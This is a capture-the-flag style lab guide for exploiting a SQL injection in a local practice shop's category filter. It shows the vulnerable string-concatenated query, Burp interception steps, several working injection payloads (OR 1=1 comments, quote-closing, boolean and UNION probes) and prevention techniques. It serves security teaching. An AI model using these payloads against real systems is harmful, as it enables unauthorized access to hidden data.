# Lab 7.1: SQL Injection in WHERE Clause - Exploitation Guide

## Overview

Lab 7.1 demonstrates a SQL injection vulnerability in a product category filter. The application executes SQL queries without properly sanitizing user input, allowing attackers to manipulate the query logic and retrieve hidden data.

## Objective

Perform a SQL injection attack to display unreleased products that should not be visible to regular users.

## The Vulnerable Query

### Normal Query (when category = 'Gifts'):

```sql
SELECT * FROM lab7_products WHERE category = 'Gifts' AND released = 1
```

This query only returns products where:

- Category matches the user's selection
- `released = 1` (publicly available products)

### The Vulnerability

The `category` parameter is directly concatenated into the SQL query without sanitization:

```python
# VULNERABLE CODE
query = f"SELECT * FROM lab7_products WHERE category = '{category}' AND released = 1"
```

## Exploitation Steps

### Step 1: Access the Lab

1. Navigate to Lab 7 from the main dashboard
2. Click "Access Module" on Lab 7.1
3. You'll see a GiftShop with category filters

### Step 2: Observe Normal Behavior

- Click on different categories (Gifts, Accessories, Lifestyle, Tech)
- Notice that only released products are shown
- The URL changes to: `/lab7/1?category=Gifts`

### Step 3: Intercept the Request with Burp Suite

1. Configure your browser to use Burp as a proxy
2. Turn on **Intercept** in Burp Suite
3. Click on any category filter button
4. Burp will intercept the GET request

### Step 4: Modify the Category Parameter

In Burp Repeater or by modifying the intercepted request, change the `category` parameter to inject SQL:

#### Payload 1: OR 1=1 (Comment out the rest)

```
category='+OR+1=1--
```

**Resulting Query:**

```sql
SELECT * FROM lab7_products WHERE category = '' OR 1=1--' AND released = 1
```

The `--` comments out everything after it, so the query becomes:

```sql
SELECT * FROM lab7_products WHERE category = '' OR 1=1
```

This returns **ALL products** (both released and unreleased) because `1=1` is always true.

#### Payload 2: OR 1=1 with Hash Comment

```
category='+OR+1=1#
```

Same effect as above, but uses `#` as the comment character (MySQL style).

#### Payload 3: Closing Quote and OR

```
category=Gifts'+OR+'1'='1
```

**Resulting Query:**

```sql
SELECT * FROM lab7_products WHERE category = 'Gifts' OR '1'='1' AND released = 1
```

Due to operator precedence, this evaluates as:

```sql
WHERE category = 'Gifts' OR ('1'='1' AND released = 1)
```

This returns all Gifts products PLUS all released products.

### Step 5: Observe the Results

After forwarding the modified request:

- The page will display products with the **"UNRELEASED" badge**
- These are the secret products:
  - SECRET: Diamond Necklace ($1,999.99)
  - SECRET: Gold Cufflinks ($499.99)
  - SECRET: Smart Home Hub ($399.99)

### Step 6: Alternative - Direct URL Manipulation

You can also exploit this directly in the browser URL bar:

```
http://127.0.0.1:5000/lab7/1?category='+OR+1=1--
```

## Why This Works

1. **String Concatenation**: User input is directly inserted into the SQL query string
2. **No Input Validation**: The application doesn't sanitize or escape special SQL characters
3. **Logical Manipulation**: The injected `OR 1=1` makes the WHERE clause always true
4. **Comment Injection**: The `--` comments out the `AND released = 1` condition

## Other Useful Payloads

### View All Products (Bypass Released Filter)

```
category=' OR '1'='1
category=' OR 1=1--
category=' OR 'a'='a
```

### Boolean-Based Testing

```
category=Gifts' AND '1'='1    (Returns Gifts - True condition)
category=Gifts' AND '1'='2    (Returns nothing - False condition)
```

### UNION-Based (Advanced - for future labs)

```
category=' UNION SELECT 1,2,3,4,5,6,7--
```

## Prevention

To prevent SQL injection:

### 1. Use Parameterized Queries (Prepared Statements)

```python
# SECURE CODE
cursor.execute(
    "SELECT * FROM lab7_products WHERE category = ? AND released = 1",
    (category,)
)
```

### 2. Use ORM (Object-Relational Mapping)

```python
# Using SQLAlchemy
products = db.session.query(Product).filter(
    Product.category == category,
    Product.released == 1
).all()
```

### 3. Input Validation (Defense in Depth)

```python
# Whitelist allowed categories
ALLOWED_CATEGORIES = ['Gifts', 'Accessories', 'Lifestyle', 'Tech']
if category not in ALLOWED_CATEGORIES:
    return "Invalid category", 400
```

### 4. Escape Special Characters

```python
import sqlite3
category = category.replace("'", "''")  # Escape single quotes
```

## Success Criteria

You have successfully completed this lab when you can see the unreleased products with the "UNRELEASED" badge displayed on the page.
